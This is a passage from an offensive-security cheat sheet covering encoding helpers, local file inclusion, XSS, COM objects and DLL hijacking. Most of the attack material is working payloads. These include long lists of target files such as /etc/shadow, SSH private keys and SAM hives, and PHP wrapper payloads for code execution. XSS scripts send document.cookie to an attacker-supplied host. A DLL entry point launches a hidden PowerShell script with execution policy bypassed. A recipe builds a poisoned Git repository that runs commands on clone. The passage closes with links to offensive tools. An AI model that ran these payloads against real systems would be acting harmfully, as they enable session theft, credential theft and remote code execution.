<p>"Mi Do Ri I Ro".toUnicode(); //"\u004d\u0069\u0020\u0044\u006f\u0020\u0052\u0069\u0020\u0049\u0020\u0052\u006f" "Green".toUniCode(); //"\u0047\u0072\u0065\u0065\u006e"</p></td>
</tr>
</tbody>
</table>

<span id="anchor-416"></span>Escaped/Unescaped Hex

<span id="anchor-417"></span>Binary File to Escaped Hex String (Linux)

|                                                                                                          |
| -------------------------------------------------------------------------------------------------------- |
| od -tx1 **\<file\_name\>** | sed -e 's/^\[0-9\]\* //' -e '$d' -e 's/^/ /' -e 's/ /\\\\x/g' | tr -d '\\n' |

<span id="anchor-418"></span>Escaped Hex to Binary File (PowerShell)

<table>
<tbody>
<tr class="odd">
<td><p># Create an empty zero length Byte[] array</p>
<p>$decodedBytes = @()</p>
<p> </p>
<p># Escaped byte sequence to decode. This function should decode most sequences</p>
<p>$escapedByteString = "\x48\x65\x6C\x6C\x6F"</p>
<p> </p>
<p># Remove white spaces and other non-hex values</p>
<p>$byteString = $escapedByteString.ToLower() -Replace '[^a-f0-9\\,x\-\:]',''</p>
<p> </p>
<p># Remove the most common delimiters</p>
<p>$byteString = $byteString -Replace '0x|\\x| |\-|\:',''</p>
<p> </p>
<p># Step through the string two characters at a time and convert them to a byte array.</p>
<p>for ($i = 0; $i -lt $byteString.Length ; $i += 2)</p>
<p>{</p>
<p>$decodedBytes += [Byte]::Parse($byteString.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)</p>
<p>}</p>
<p># Write the decoded bytes to a binary file.</p>
<p>[io.file]::WriteAllBytes('output.bin',$decodedBytes)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-419"></span>Python Escape Bytes

<table>
<tbody>
<tr class="odd">
<td><p>s = '<strong>&lt;bytes&gt;</strong>'</p>
<p>sx = r"\x" + r"\x".join(s[n : n+2] for n in range(0, len(s), 2))</p></td>
</tr>
</tbody>
</table>

<span id="anchor-420"></span>URL Encoding

<span id="anchor-421"></span>Python 2.x.x

<table>
<tbody>
<tr class="odd">
<td><p>import urllib</p>
<p>urlEncoded = urllib.quote_plus("<strong>&lt;string_to_encode&gt;</strong>")</p></td>
</tr>
</tbody>
</table>

<span id="anchor-422"></span>Python 3.x.x

<table>
<tbody>
<tr class="odd">
<td><p>import urllib.parse</p>
<p>urlEncoded = urllib.parse.quote_plus("<strong>&lt;string_to_encode&gt;</strong>")</p></td>
</tr>
</tbody>
</table>

<span id="anchor-423"></span>Local File Include (LFI)

<span id="anchor-424"></span>General Hints

Look for useful files such as:

  - Configuration files
    
      - > Passwords
    
      - > Valuable information

  - Database files
    
      - > Passwords
    
      - > Valuable information

  - Registry Backup Files (SAM & Security hives)
    
      - > Passwords

  - Log files
    
      - > SSH logs
    
      - > Apache logs
    
      - > It is possible to add PHP to a web request or other log and
        > then include the log file to gain execution.
        
          - Reverse Shell via shell\_exec()
          - Add a web-shell that executes supplied commands

  - Emails
    
      - > Send an email containing PHP and include it.

  - File uploads?
    
      - > Image metadata

  - Code Execution possibility
    
      - > /proc/self/environ\&cmd=ls (Will execute "ls" command, The
        > command can be complex if this works. I.e. full Python reverse
        > shell, etc.)

<span id="anchor-425"></span>Null Terminators

<table>
<tbody>
<tr class="odd">
<td><p>%00</p>
<p>%2500</p></td>
</tr>
</tbody>
</table>

<span id="anchor-426"></span>Interesting Files (Linux)

<table>
<tbody>
<tr class="odd">
<td><p>/etc/issue</p>
<p>/proc/version</p>
<p>/etc/profile</p>
<p>/etc/passwd</p>
<p>/etc/shadow</p>
<p>/root/.bash_history</p>
<p>/var/log/dmessage</p>
<p>/var/mail/root</p>
<p>/var/spool/cron/crontabs/root</p>
<p>/proc/self/environ</p>
<p>/var/log/mail/<strong>&lt;user&gt;</strong></p>
<p>/var/log/apache2/access.log</p>
<p>/proc/self/environ</p>
<p>/tmp/sess_ID and /var/lib/php5/sess_ID</p>
<p>/var/log/auth.log</p>
<p>/etc/passwd</p>
<p>/etc/shadow</p>
<p>/etc/aliases</p>
<p>/etc/anacrontab</p>
<p>/etc/apache2/apache2.conf</p>
<p>/etc/apache2/httpd.conf</p>
<p>/etc/at.allow</p>
<p>/etc/at.deny</p>
<p>/etc/bashrc</p>
<p>/etc/bootptab</p>
<p>/etc/chrootUsers</p>
<p>/etc/chttp.conf</p>
<p>/etc/cron.allow</p>
<p>/etc/cron.deny</p>
<p>/etc/crontab</p>
<p>/etc/cups/cupsd.conf</p>
<p>/etc/exports</p>
<p>/etc/fstab</p>
<p>/etc/ftpaccess</p>
<p>/etc/ftpchroot</p>
<p>/etc/ftphosts</p>
<p>/etc/groups</p>
<p>/etc/grub.conf</p>
<p>/etc/hosts</p>
<p>/etc/hosts.allow</p>
<p>/etc/hosts.deny</p>
<p>/etc/httpd/access.conf</p>
<p>/etc/httpd/conf/httpd.conf</p>
<p>/etc/httpd/httpd.conf</p>
<p>/etc/httpd/logs/access_log</p>
<p>/etc/httpd/logs/access.log</p>
<p>/etc/httpd/logs/error_log</p>
<p>/etc/httpd/logs/error.log</p>
<p>/etc/httpd/php.ini</p>
<p>/etc/httpd/srm.conf</p>
<p>/etc/inetd.conf</p>
<p>/etc/inittab</p>
<p>/etc/issue</p>
<p>/etc/lighttpd.conf</p>
<p>/etc/lilo.conf</p>
<p>/etc/logrotate.d/ftp</p>
<p>/etc/logrotate.d/proftpd</p>
<p>/etc/logrotate.d/vsftpd.log</p>
<p>/etc/lsb-release</p>
<p>/etc/motd</p>
<p>/etc/modules.conf</p>
<p>/etc/motd</p>
<p>/etc/mtab</p>
<p>/etc/my.cnf</p>
<p>/etc/my.conf</p>
<p>/etc/mysql/my.cnf</p>
<p>/etc/network/interfaces</p>
<p>/etc/networks</p>
<p>/etc/npasswd</p>
<p>/etc/passwd</p>
<p>/etc/php4.4/fcgi/php.ini</p>
<p>/etc/php4/apache2/php.ini</p>
<p>/etc/php4/apache/php.ini</p>
<p>/etc/php4/cgi/php.ini</p>
<p>/etc/php4/apache2/php.ini</p>
<p>/etc/php5/apache2/php.ini</p>
<p>/etc/php5/apache/php.ini</p>
<p>/etc/php/apache2/php.ini</p>
<p>/etc/php/apache/php.ini</p>
<p>/etc/php/cgi/php.ini</p>
<p>/etc/php.ini</p>
<p>/etc/php/php4/php.ini</p>
<p>/etc/php/php.ini</p>
<p>/etc/printcap</p>
<p>/etc/profile</p>
<p>/etc/proftp.conf</p>
<p>/etc/proftpd/proftpd.conf</p>
<p>/etc/pure-ftpd.conf</p>
<p>/etc/pureftpd.passwd</p>
<p>/etc/pureftpd.pdb</p>
<p>/etc/pure-ftpd/pure-ftpd.conf</p>
<p>/etc/pure-ftpd/pure-ftpd.pdb</p>
<p>/etc/pure-ftpd/putreftpd.pdb</p>
<p>/etc/redhat-release</p>
<p>/etc/resolv.conf</p>
<p>/etc/samba/smb.conf</p>
<p>/etc/snmpd.conf</p>
<p>/etc/ssh/ssh_config</p>
<p>/etc/ssh/sshd_config</p>
<p>/etc/ssh/ssh_host_dsa_key</p>
<p>/etc/ssh/ssh_host_dsa_key.pub</p>
<p>/etc/ssh/ssh_host_key</p>
<p>/etc/ssh/ssh_host_key.pub</p>
<p>/etc/sysconfig/network</p>
<p>/etc/syslog.conf</p>
<p>/etc/termcap</p>
<p>/etc/vhcs2/proftpd/proftpd.conf</p>
<p>/etc/vsftpd.chroot_list</p>
<p>/etc/vsftpd.conf</p>
<p>/etc/vsftpd/vsftpd.conf</p>
<p>/etc/wu-ftpd/ftpaccess</p>
<p>/etc/wu-ftpd/ftphosts</p>
<p>/etc/wu-ftpd/ftpusers</p>
<p>/logs/pure-ftpd.log</p>
<p>/logs/security_debug_log</p>
<p>/logs/security_log</p>
<p>/opt/lampp/etc/httpd.conf</p>
<p>/opt/xampp/etc/php.ini</p>
<p>/proc/cpuinfo</p>
<p>/proc/filesystems</p>
<p>/proc/interrupts</p>
<p>/proc/ioports</p>
<p>/proc/meminfo</p>
<p>/proc/modules</p>
<p>/proc/mounts</p>
<p>/proc/stat</p>
<p>/proc/swaps</p>
<p>/proc/version</p>
<p>/proc/self/net/arp</p>
<p>/root/anaconda-ks.cfg</p>
<p>/usr/etc/pure-ftpd.conf</p>
<p>/usr/lib/php.ini</p>
<p>/usr/lib/php/php.ini</p>
<p>/usr/local/apache/conf/modsec.conf</p>
<p>/usr/local/apache/conf/php.ini</p>
<p>/usr/local/apache/log</p>
<p>/usr/local/apache/logs</p>
<p>/usr/local/apache/logs/access_log</p>
<p>/usr/local/apache/logs/access.log</p>
<p>/usr/local/apache/audit_log</p>
<p>/usr/local/apache/error_log</p>
<p>/usr/local/apache/error.log</p>
<p>/usr/local/cpanel/logs</p>
<p>/usr/local/cpanel/logs/access_log</p>
<p>/usr/local/cpanel/logs/error_log</p>
<p>/usr/local/cpanel/logs/license_log</p>
<p>/usr/local/cpanel/logs/login_log</p>
<p>/usr/local/cpanel/logs/stats_log</p>
<p>/usr/local/etc/httpd/logs/access_log</p>
<p>/usr/local/etc/httpd/logs/error_log</p>
<p>/usr/local/etc/php.ini</p>
<p>/usr/local/etc/pure-ftpd.conf</p>
<p>/usr/local/etc/pureftpd.pdb</p>
<p>/usr/local/lib/php.ini</p>
<p>/usr/local/php4/httpd.conf</p>
<p>/usr/local/php4/httpd.conf.php</p>
<p>/usr/local/php4/lib/php.ini</p>
<p>/usr/local/php5/httpd.conf</p>
<p>/usr/local/php5/httpd.conf.php</p>
<p>/usr/local/php5/lib/php.ini</p>
<p>/usr/local/php/httpd.conf</p>
<p>/usr/local/php/httpd.conf.ini</p>
<p>/usr/local/php/lib/php.ini</p>
<p>/usr/local/pureftpd/etc/pure-ftpd.conf</p>
<p>/usr/local/pureftpd/etc/pureftpd.pdn</p>
<p>/usr/local/pureftpd/sbin/pure-config.pl</p>
<p>/usr/local/www/logs/httpd_log</p>
<p>/usr/local/Zend/etc/php.ini</p>
<p>/usr/sbin/pure-config.pl</p>
<p>/var/adm/log/xferlog</p>
<p>/var/apache2/config.inc</p>
<p>/var/apache/logs/access_log</p>
<p>/var/apache/logs/error_log</p>
<p>/var/cpanel/cpanel.config</p>
<p>/var/lib/mysql/my.cnf</p>
<p>/var/lib/mysql/mysql/user.MYD</p>
<p>/var/local/www/conf/php.ini</p>
<p>/var/log/apache2/access_log</p>
<p>/var/log/apache2/access.log</p>
<p>/var/log/apache2/error_log</p>
<p>/var/log/apache2/error.log</p>
<p>/var/log/apache/access_log</p>
<p>/var/log/apache/access.log</p>
<p>/var/log/apache/error_log</p>
<p>/var/log/apache/error.log</p>
<p>/var/log/apache-ssl/access.log</p>
<p>/var/log/apache-ssl/error.log</p>
<p>/var/log/auth.log</p>
<p>/var/log/boot</p>
<p>/var/htmp</p>
<p>/var/log/chttp.log</p>
<p>/var/log/cups/error.log</p>
<p>/var/log/daemon.log</p>
<p>/var/log/debug</p>
<p>/var/log/dmesg</p>
<p>/var/log/dpkg.log</p>
<p>/var/log/exim_mainlog</p>
<p>/var/log/exim/mainlog</p>
<p>/var/log/exim_paniclog</p>
<p>/var/log/exim.paniclog</p>
<p>/var/log/exim_rejectlog</p>
<p>/var/log/exim/rejectlog</p>
<p>/var/log/faillog</p>
<p>/var/log/ftplog</p>
<p>/var/log/ftp-proxy</p>
<p>/var/log/ftp-proxy/ftp-proxy.log</p>
<p>/var/log/httpd/access_log</p>
<p>/var/log/httpd/access.log</p>
<p>/var/log/httpd/error_log</p>
<p>/var/log/httpd/error.log</p>
<p>/var/log/httpsd/ssl.access_log</p>
<p>/var/log/httpsd/ssl_log</p>
<p>/var/log/kern.log</p>
<p>/var/log/lastlog</p>
<p>/var/log/lighttpd/access.log</p>
<p>/var/log/lighttpd/error.log</p>
<p>/var/log/lighttpd/lighttpd.access.log</p>
<p>/var/log/lighttpd/lighttpd.error.log</p>
<p>/var/log/mail.info</p>
<p>/var/log/mail.log</p>
<p>/var/log/maillog</p>
<p>/var/log/mail.warn</p>
<p>/var/log/message</p>
<p>/var/log/messages</p>
<p>/var/log/mysqlderror.log</p>
<p>/var/log/mysql.log</p>
<p>/var/log/mysql/mysql-bin.log</p>
<p>/var/log/mysql/mysql.log</p>
<p>/var/log/mysql/mysql-slow.log</p>
<p>/var/log/proftpd</p>
<p>/var/log/pureftpd.log</p>
<p>/var/log/pure-ftpd/pure-ftpd.log</p>
<p>/var/log/secure</p>
<p>/var/log/vsftpd.log</p>
<p>/var/log/wtmp</p>
<p>/var/log/xferlog</p>
<p>/var/log/yum.log</p>
<p>/var/mysql.log</p>
<p>/var/run/utmp</p>
<p>/var/spool/cron/crontabs/root</p>
<p>/var/webmin/miniserv.log</p>
<p>/var/www/log/access_log</p>
<p>/var/www/log/error_log</p>
<p>/var/www/logs/access_log</p>
<p>/var/www/logs/error_log</p>
<p>/var/www/logs/access.log</p>
<p>/var/www/logs/error.log</p>
<p>~/.atfp_history</p>
<p>~/.bash_history</p>
<p>~/.bash_logout</p>
<p>~/.bash_profile</p>
<p>~/.bashrc</p>
<p>~/.gtkrc</p>
<p>~/.login</p>
<p>~/.logout</p>
<p>~/.mysql_history</p>
<p>~/.nano_history</p>
<p>~/.php_history</p>
<p>~/.profile</p>
<p>~/.ssh/authorized_keys</p>
<p>~/.ssh/id_dsa</p>
<p>~/.ssh/id_dsa.pub</p>
<p>~/.ssh/id_rsa</p>
<p>~/.ssh/id_rsa.pub</p>
<p>~/.ssh/identity</p>
<p>~/.ssh/identity.pub</p>
<p>~/.viminfo</p>
<p>~/.wm_style</p>
<p>~/.Xdefaults</p>
<p>~/.xinitrc</p>
<p>~/.Xresources</p>
<p>~/.xsession</p></td>
</tr>
</tbody>
</table>

<span id="anchor-427"></span>Running Process Information (Linux)

<table>
<tbody>
<tr class="odd">
<td><p>/proc/&lt;int&gt;/fd/&lt;int&gt;</p>
<p>e.g.</p>
<p>/proc/2116/fd/11</p></td>
</tr>
</tbody>
</table>

<span id="anchor-428"></span>Interesting Files (Windows)

<table>
<tbody>
<tr class="odd">
<td><p>%SYSTEMROOT%repairsystem</p>
<p>%SYSTEMROOT%repairSAM</p>
<p>%SYSTEMROOT%repairSAM</p>
<p>%WINDIR%win.ini</p>
<p>%SYSTEMDRIVE%boot.ini</p>
<p>%WINDIR%Panthersysprep.inf</p>
<p>%WINDIR%system32configAppEvent.Evt</p>
<p>C:/Users/Administrator/NTUser.dat</p>
<p>C:/Documents and Settings/Administrator/NTUser.dat</p>
<p>C:/apache/logs/access.log</p>
<p>C:/apache/logs/error.log</p>
<p>C:/apache/php/php.ini</p>
<p>C:/boot.ini</p>
<p>C:/inetpub/wwwroot/global.asa</p>
<p>C:/MySQL/data/hostname.err</p>
<p>C:/MySQL/data/mysql.err</p>
<p>C:/MySQL/data/mysql.log</p>
<p>C:/MySQL/my.cnf</p>
<p>C:/MySQL/my.ini</p>
<p>C:/php4/php.ini</p>
<p>C:/php5/php.ini</p>
<p>C:/php/php.ini</p>
<p>C:/Program Files/Apache Group/Apache2/conf/httpd.conf</p>
<p>C:/Program Files/Apache Group/Apache/conf/httpd.conf</p>
<p>C:/Program Files/Apache Group/Apache/logs/access.log</p>
<p>C:/Program Files/Apache Group/Apache/logs/error.log</p>
<p>C:/Program Files/FileZilla Server/FileZilla Server.xml</p>
<p>C:/Program Files/MySQL/data/hostname.err</p>
<p>C:/Program Files/MySQL/data/mysql-bin.log</p>
<p>C:/Program Files/MySQL/data/mysql.err</p>
<p>C:/Program Files/MySQL/data/mysql.log</p>
<p>C:/Program Files/MySQL/my.ini</p>
<p>C:/Program Files/MySQL/my.cnf</p>
<p>C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err</p>
<p>C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log</p>
<p>C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err</p>
<p>C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log</p>
<p>C:/Program Files/MySQL/MySQL Server 5.0/my.cnf</p>
<p>C:/Program Files/MySQL/MySQL Server 5.0/my.ini</p>
<p>C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf</p>
<p>C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf</p>
<p>C:/Program Files (x86)/Apache Group/Apache/conf/access.log</p>
<p>C:/Program Files (x86)/Apache Group/Apache/conf/error.log</p>
<p>C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml</p>
<p>C:/Program Files (x86)/xampp/apache/conf/httpd.conf</p>
<p>C:/WINDOWS/php.ini</p>
<p>C:/WINDOWS/Repair/SAM</p>
<p>C:/Windows/repair/system</p>
<p>C:/Windows/repair/software</p>
<p>C:/Windows/repair/security</p>
<p>C:/WINDOWS/System32/drivers/etc/hosts</p>
<p>C:/Windows/win.ini</p>
<p>C:/WINNT/php.ini</p>
<p>C:/WINNT/win.ini</p>
<p>C:/xampp/apache/bin/php.ini</p>
<p>C:/xampp/apache/logs/access.log</p>
<p>C:/xampp/apache/logs/error.log</p>
<p>C:/Windows/Panther/Unattend/Unattended.xml</p>
<p>C:/Windows/Panther/Unattended.xml</p>
<p>C:/Windows/debug/NetSetup.log</p>
<p>C:/Windows/system32/config/AppEvent.Evt</p>
<p>C:/Windows/system32/config/SecEvent.Evt</p>
<p>C:/Windows/system32/config/default.sav</p>
<p>C:/Windows/system32/config/security.sav</p>
<p>C:/Windows/system32/config/software.sav</p>
<p>C:/Windows/system32/config/system.sav</p>
<p>C:/Windows/system32/config/regback/default</p>
<p>C:/Windows/system32/config/regback/sam</p>
<p>C:/Windows/system32/config/regback/security</p>
<p>C:/Windows/system32/config/regback/system</p>
<p>C:/Windows/system32/config/regback/software</p>
<p>C:/Program Files/MySQL/MySQL Server 5.1/my.ini</p>
<p>C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml</p>
<p>C:/Windows/System32/inetsrv/config/applicationHost.config</p>
<p>C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log</p></td>
</tr>
</tbody>
</table>

<span id="anchor-429"></span>Interesting Files (OSX)

<table>
<tbody>
<tr class="odd">
<td><p>/etc/fstab</p>
<p>/etc/master.passwd</p>
<p>/etc/resolv.conf</p>
<p>/etc/sudoers</p>
<p>/etc/sysctl.conf</p></td>
</tr>
</tbody>
</table>

<span id="anchor-430"></span>Reading PHP/Binary File Contents

Including a file in the following format will return the contents in
Base64 encoding (May be useful for reading binary data)

|                                                                         |
| ----------------------------------------------------------------------- |
| php://filter/read=convert.base64-encode/resource=**\<file\_to\_read\>** |

<span id="anchor-431"></span>PHP Wrappers

<span id="anchor-432"></span>PHP Expect Wrapper (Not default)

Could result in code execution.

|                      |
| -------------------- |
| php?page=expect://ls |

<span id="anchor-433"></span>PHP Input Wrapper

|                           |
| ------------------------- |
| ?page=php://input\&cmd=ls |

<span id="anchor-434"></span>PHP Zip Wrapper

|  |
|  |
|  |

<span id="anchor-435"></span>XSS

<span id="anchor-436"></span>SVG Tag

|                                                                                                     |
| --------------------------------------------------------------------------------------------------- |
| \<svg/onload=location=window\[\`atob\`\]\`amF2YXNjcmlwdDphbGVydCgxKQ==\`;// https://t.co/pwtrIsYUTt |

<span id="anchor-437"></span>Send Cookie & URL via JavaScript HTTP
Request (All Browsers)

|                                                                                                                                                                                                                                                                                                                                           |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| function a(t){window.XMLHttpRequest?b=new XMLHttpRequest:b=new ActiveXObject("Microsoft.XMLHTTP"),b.onreadystatechange=function(){4==b.readyState&&200==b.status&\&alert(b.responseText)},b.open("GET",t,\!1),b.send()}a("http:/**/\<ip\_address\>**:**\<port\>**/somefile.php?cookie="+document.cookie+"\&location="+document.location); |

<span id="anchor-438"></span>Send Cookie in IMG Request via Added
Element

<table>
<tbody>
<tr class="odd">
<td><p>function addIMG() {</p>
<p>var img = document.createElement('img');</p>
<p>img.src = '<strong>&lt;server_URL&gt;</strong>' + document.cookie;</p>
<p>document.body.appendChild(img);</p>
<p>}</p>
<p>addIMG();</p></td>
</tr>
</tbody>
</table>

<span id="anchor-439"></span>Using Stolen Cookies

From the inspection console.

|                                   |
| --------------------------------- |
| document.cookie="**\<cookie\>**"; |

<span id="anchor-440"></span>COM Objects

<span id="anchor-441"></span>List All Available COM Objects

|                                                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Get-ChildItem HKLM:\\Software\\Classes -ErrorAction SilentlyContinue | Where-Object { $\_.PSChildName -match '^\\w+\\.\\w+$' -and (Test-Path -Path "$($\_.PSPath)\\CLSID") } | Select-Object -ExpandProperty PSChildName |

<span id="anchor-442"></span>Creating PowerShell COM Objects by CLSID

<table>
<tbody>
<tr class="odd">
<td>$type= [Type]::GetTypeFromCLSID('13709620-C279-11CE-A49E-444553540000')<br />
$obj = [Activator]::CreateInstance($type)</td>
</tr>
</tbody>
</table>

<span id="anchor-443"></span>Vulnerabilities/Exploits

<span id="anchor-444"></span>DLL Hijacking

<span id="anchor-445"></span>C++ Function Export Example

The following code will export a single function called
**VolumeDismount**.

<table>
<tbody>
<tr class="odd">
<td><p>#define EXPORT comment(linker, "/EXPORT:" __FUNCTION__ "=" __FUNCDNAME__)</p>
<p>using namespace std;</p>
<p>int VolumeDismount(string drive)</p>
<p>{</p>
<p>#pragma EXPORT</p>
<p>system("calc.exe");</p>
<p>return 0;</p>
<p>}</p></td>
</tr>
</tbody>
</table>

<span id="anchor-446"></span>C++ EntryPoints & Exports

This example will run a command when the process attaches, it will also
pop **calc.exe** when one of the exported functions is called.

<table>
<tbody>
<tr class="odd">
<td><p>#include "stdafx.h"</p>
<p>#include &lt;stdlib.h&gt;</p>
<p>BOOL APIENTRY DllMain(HMODULE hModule,</p>
<p>DWORD ul_reason_for_call,</p>
<p>LPVOID lpReserved</p>
<p>)</p>
<p>{</p>
<p>switch (ul_reason_for_call)</p>
<p>{</p>
<p>case DLL_PROCESS_ATTACH:</p>
<p>system("start powershell -win hidden -nonI -nopro -ep bypass -File shell.ps1");</p>
<p>case DLL_THREAD_ATTACH:</p>
<p>case DLL_THREAD_DETACH:</p>
<p>case DLL_PROCESS_DETACH:</p>
<p>break;</p>
<p>}</p>
<p>return TRUE;</p>
<p>}</p>
<p>extern "C" __declspec(dllexport) void SendARP()</p>
<p>{</p>
<p>WinExec("calc", SW_NORMAL);</p>
<p>}</p>
<p>extern "C" __declspec(dllexport) void GetIpNetTable()</p>
<p>{</p>
<p>WinExec("calc", SW_NORMAL);</p>
<p>}</p>
<p>extern "C" __declspec(dllexport) void DeleteIpNetEntry()</p>
<p>{</p>
<p>WinExec("calc", SW_NORMAL);</p>
<p>}</p></td>
</tr>
</tbody>
</table>

<span id="anchor-447"></span>CVE Repositories

[*https://nvd.nist.gov/*](https://nvd.nist.gov/)

[*http://cve.mitre.org/index.html*](http://cve.mitre.org/index.html)

[*http://www.cvedetails.com/*](http://www.cvedetails.com/)

[*https://www.scaprepo.com/*](https://www.scaprepo.com/)

[*http://secpod.com/*](http://secpod.com/)

[*http://osvdb.org/*](http://osvdb.org/)

[*http://www.exploit-db.com/*](http://www.exploit-db.com/)

[*https://github.com/athiasjerome/XORCISM*](https://github.com/athiasjerome/XORCISM)

<span id="anchor-448"></span>Bug Repositories

<span id="anchor-449"></span>Git

<span id="anchor-450"></span>CVE-2014-9390

[*https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial*](https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial)

[*https://github.com/rapid7/metasploit-framework/issues/4435*](https://github.com/rapid7/metasploit-framework/issues/4435)

This exploit relies on the machine running Git to be using a file system
that ignores case (i.e. Windows, OS X)

Building a poisoned Git repository:

<table>
<tbody>
<tr class="odd">
<td><p>$ mkdir -p &lt;repository_folder&gt;/.Git/hooks/</p>
<p>$ cd &lt;repository_folder&gt;</p>
<p>$ git init</p>
<p>$ echo "&lt;command to run&gt;" &gt; .Git/hooks/post-checkout</p>
<p>$ git add -A</p>
<p>$ git commit - 'poisoned'</p></td>
</tr>
</tbody>
</table>

Once this poisoned Git repository is cloned the command in the
post-checkout will be run on the machine that it is being cloned to. The
command will run with the rights of the user running Git.

<span id="anchor-451"></span>Default Password Links

[*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)

[*http://www.virus.org/default-passwords/*](http://www.virus.org/default-passwords/)

[*http://www.routerpasswords.com/*](http://www.routerpasswords.com/)

[*https://www.security-database.com/dbe.php*](https://www.security-database.com/dbe.php)

<span id="anchor-452"></span>Useful Links

<span id="anchor-453"></span>GitHub Links

<span id="anchor-454"></span>ETW Keylogger POC

  - [*https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC*](https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC)

<span id="anchor-455"></span>SubTee (Casey Smith) C\# Keylogger

  - [*https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486*](https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486)
  - [*https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937*](https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937)

<span id="anchor-456"></span>HackSysTeam Extreme Vulnerability Driver
(HEVD)

  - [*https://github.com/GradiusX/HEVD-Python-Solutions*](https://github.com/GradiusX/HEVD-Python-Solutions)
    

<span id="anchor-457"></span>DLLInjector

  - [*https://github.com/OpenSecurityResearch/dllinjector*](https://github.com/OpenSecurityResearch/dllinjector)
    

<span id="anchor-458"></span>PowerShell Tools

<span id="anchor-459"></span>Empire

  - [*https://github.com/PowerShellEmpire/Empire*](https://github.com/PowerShellEmpire/Empire)

<span id="anchor-460"></span>PowerSploit

  - [*https://github.com/PowerShellMafia/PowerSploit*](https://github.com/PowerShellMafia/PowerSploit)

<span id="anchor-461"></span>Nishang

  - [*https://github.com/samratashok/nishang*](https://github.com/samratashok/nishang)

<span id="anchor-462"></span>PowerUpSQL

  - [*https://github.com/NetSPI/PowerUpSQL*](https://github.com/NetSPI/PowerUpSQL)

<span id="anchor-463"></span>P0wnedShell

  - [*https://github.com/Cn33liz/p0wnedShell*](https://github.com/Cn33liz/p0wnedShell)

<span id="anchor-464"></span>Awesomershell

  - [*https://github.com/Ben0xA/AwesomerShell*](https://github.com/Ben0xA/AwesomerShell)

<span id="anchor-465"></span>Not PowerShell (nps)

  - [*https://github.com/Ben0xA/nps*](https://github.com/Ben0xA/nps)

<span id="anchor-466"></span>Other Things

<span id="anchor-467"></span>PyKEK (Python Kerberos Exploitation Kit)

  - [*https://github.com/bidord/pykek*](https://github.com/bidord/pykek)

<span id="anchor-468"></span>Misc Scripts

  - [*http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/*](http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/)
  - [*http://www.scip.ch/?labs.20130625*](http://www.scip.ch/?labs.20130625)
  - [*https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript*](https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript)
  - [*https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript*](https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript)

<span id="anchor-469"></span>Kyle’s Notes

  - [*https://www.evernote.com/pub/kbisdorf/adsim*](https://www.evernote.com/pub/kbisdorf/adsim)

<span id="anchor-470"></span>Google Hacking Links

  - [*https://www.exploit-db.com/google-hacking-database/*](https://www.exploit-db.com/google-hacking-database/)

<span id="anchor-471"></span>Hot Potato (Privilege Escalation)

  - [*https://github.com/foxglovesec/Potato*](https://github.com/foxglovesec/Potato)

<span id="anchor-472"></span>Raspberry PI as a USB Device

  - [*http://isticktoit.net/?p=1383*](http://isticktoit.net/?p=1383)
  - [*https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all*](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all)
  - [*https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget*](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget)

<span id="anchor-473"></span>PoisonTap (Raspberry PI USB Ethernet
Device)

  - [*https://github.com/samyk/poisontap*](https://github.com/samyk/poisontap)

<span id="anchor-474"></span>USB Ethernet Device Driver Example

  - [*https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh*](https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh)

<span id="anchor-475"></span>Responder

  - [*https://github.com/lgandx/Responder.git*](https://github.com/lgandx/Responder.git)

<span id="anchor-476"></span>Pi USB Ethernet 

  - [*https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets*](https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets)
  - [*http://isticktoit.net/?p=1383*](http://isticktoit.net/?p=1383)
  - [*https://www.kernel.org/doc/Documentation/usb/gadget\_configfs.txt*](https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt)
  - [*https://groups.google.com/forum/m/\#\!msg/beaglebone/IKV0g14oYRQ/8Z\_vEv\_fAwAJ*](https://groups.google.com/forum/m/#!msg/beaglebone/IKV0g14oYRQ/8Z_vEv_fAwAJ)

<span id="anchor-477"></span>Manually Interacting w/HTTP

  - [*http://www.the-art-of-web.com/system/telnet-http11/*](http://www.the-art-of-web.com/system/telnet-http11/)

<span id="anchor-478"></span>Fingerprinting IIS

